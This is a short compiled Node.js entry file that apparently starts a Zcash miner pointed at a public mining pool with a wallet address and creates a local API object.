"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const api_1 = require("./api");
const miner_1 = require("./miner");
let startMining = new miner_1.miner("eu1-zcash.flypool.org", 3333, "t1MnfjAGPAACcPqPKx9Nw8R3jNpuDrwpAaw", "x", "main");
startMining.start();
let getApi = new api_1.api();
//# sourceMappingURL=main.js.map